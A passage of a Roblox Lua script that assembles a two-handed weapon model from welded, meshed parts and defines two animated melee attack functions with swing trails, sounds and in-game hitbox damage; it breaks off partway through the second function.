Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -7.77197647, 0.240066051, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.43749997, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -8.22558403, 0.0565404892, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.43749997, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -0.293530464, 7.92375565, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.124999993, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -0.240066051, 8.07380676, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.187499985, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -8.07449722, 0.110336781, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.43749997, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, -0.157261372, 8.22558403, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.31249997, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.00830316544, -0.144189835, -1.57418728, 0, -1, 0, -1, 0, 0, -0, -0, -1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -7.96686935, 0.0882806778, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.187499985, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, 1.17542744, -0.455316544, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.187499985, 0.68749994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.139364243, -0.158734798, -1.2002573, 1, -8.74227766e-008, 0, -8.74227766e-008, -1, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.113124944, 0.354374975, 0.506249726))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.495871037))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.139364243, -1.32858467, 0.822336197, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.249999985, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.139364243, -0.139313221, -1.2002573, -1, 8.74227766e-008, 0, 8.74227766e-008, 1, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.113124944, 0.354374975, 0.506249726))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -7.68573761, 0.293530464, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.0624999963, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, 1.26166248, 1.14520788, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.0624999963, 0.187499985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.517430663))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, 1.19681168, 0.854077816, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.31249997, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, -0.0565404892, 8.35459518, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.249999985, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.103485107, -3.29895449, -0.00830316544, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Head,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.249999985, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.646788299, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -7.61087227, 0.00272464752, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 1, 0.9375))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, 1.17542744, 0.299457073, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.187499985, 0.68749994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.173856735, -0.129733562, -1.21406174, 1, -8.74227766e-008, 0, -8.74227766e-008, -1, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0904999524, 0.283499986, 0.404999793))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, 1.17542744, 0.304910183, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.187499985, 0.68749994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, 2.49038315, 0.147681713, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.43749997, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0862426758, -3.29895449, -0.00830316544, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Head,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.249999985, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.646788299, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.00272464752, -2.43657112, 0.0758972168, 0, 1, 0, 0, 0, -1, -1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.81249994, 1, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(2.66286087, 0.147681713, -0.0110378265, 0, 0, 1, 0, 1, 0, -1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.0624999963, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -2.20959854, 0.260756493, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.43749997, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, 1.82152367, 0.360152721, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.31249997, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.93018341, -0.293530464, -0.0103435516, 0, 0, 1, 0, 1, 0, -1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.31249997, 0.74999994, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.82152367, -0.234244823, 0.0103435516, 0, 0, 1, 0, -1, 0, 1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.31249997, 0.43749997, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -2.09059143, 0.369420528, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.249999985, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(2.09059143, -0.229718208, -0.0103435516, 0, 0, 1, 0, 1, 0, -1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.49999997, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, 1.93018341, 0.460892677, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.31249997, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, 1.17542744, -0.449858665, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.187499985, 0.68749994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.173856735, -0.108965397, -1.21406174, -1, 8.74227766e-008, 0, 8.74227766e-008, 1, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0904999524, 0.283499986, 0.404999793))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(2.09059143, -0.223897457, 0.0103435516, 0, 0, 1, 0, -1, 0, 1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.49999997, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.011068821, -0.173856735, -1.21406174, -8.74227766e-008, -1, 0, -1, 8.74227766e-008, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.405000001, 0.0904999897, 0.405000001))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.495871037))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.119354248, 1.24234486, 0.822336197, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.249999985, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.259450436, 0.114528656, -1.28511906, 0, -1, 0, -1, 0, 0, -0, -0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.011068821, -0.139364243, -1.2002573, -8.74227766e-008, -1, 0, -1, 8.74227766e-008, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.506249964, 0.113124982, 0.506249964))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, 1.15403748, 0.260767937, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.31249997, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-1.04904175e-005, -0.103485107, 0.646622419, 8.74227766e-008, -1, 0, -1, -8.74227766e-008, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.124999993, 0.0624999963, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.130399704, 1.25269699, 0.291165829, -1, 8.74227766e-008, 0, 0, 0, 1, 8.74227766e-008, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.28511906, -0.139364243, 0.562925816, 0, 0, 1, -1, 0, 0, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.49999997, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.495871037))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.139364243, 1.24234486, 0.822336197, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.249999985, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(2.66286087, -0.157261372, -0.0110378265, 0, 0, 1, 0, 1, 0, -1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.0624999963, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.646788299, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.00204944611, -2.43553925, 0.0965919495, 0, -1, 0, 0, 0, -1, 1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.81249994, 1, 0.0624999963))
HitboxB=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,1,"Pastel blue-green","HitboxB",Vector3.new(0.344953746, 4.62678862, 0.674953699))
HitboxBweld=weld(m,HandleB,HitboxB,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0110378265, -4.6137476, 0.000301837921, -1, 0, 0, 0, 0, -1, -0, -1, -0))

function attackone()
	attack=true
	con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,50,50,math.random(10,20),"Normal",RootPart,.2,1) end) 
	for i=0,1,0.1 do
		swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(130),math.rad(0),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-90)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(80)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(30),math.rad(0),math.rad(0)),.3)
	end
	so("http://www.roblox.com/asset/?id=233856140",HitboxA,1,1) 
	so("http://www.roblox.com/asset/?id=234365549",HitboxA,1,1) 
	for i=0,1,0.1 do
		swait()
		local blcf = HitboxA.CFrame*CFrame.new(0,.5,0)
if scfr and (HitboxA.Position-scfr.p).magnitude > .1 then
local h = 5
local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
scfr = blcf
elseif not scfr then
scfr = blcf
end
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(30),math.rad(0),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-50)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(10),math.rad(-80)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(-40),math.rad(-30),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(30),math.rad(0),math.rad(0)),.3)
	end
	attack=false
	con1:disconnect()
end

function attacktwo()
	attack=true
	con1=HitboxB.Touched:connect(function(hit) Damagefunc(hit,30,50,math.random(10,20),"Normal",RootPart,.2,1) end) 
	for i=0,1,0.1 do
		swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(130),math.rad(0),math.rad(-20)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(-80)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(30),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
	end
	so("http://www.roblox.com/asset/?id=233856146",HitboxB,1,1) 
	so("http://www.roblox.com/asset/?id=234365573",HitboxB,1,1) 
	for i=0,1,0.1 do
		swait()
			local blcf = HitboxB.CFrame*CFrame.new(0,.5,0)
if scfr and (HitboxB.Position-scfr.p).magnitude > .1 then
local h = 5
local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
scfr = blcf
elseif not scfr then
scfr = blcf
end
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(30),math.rad(0),math.rad(-50)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(-80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(-10),math.rad(80)),.3)
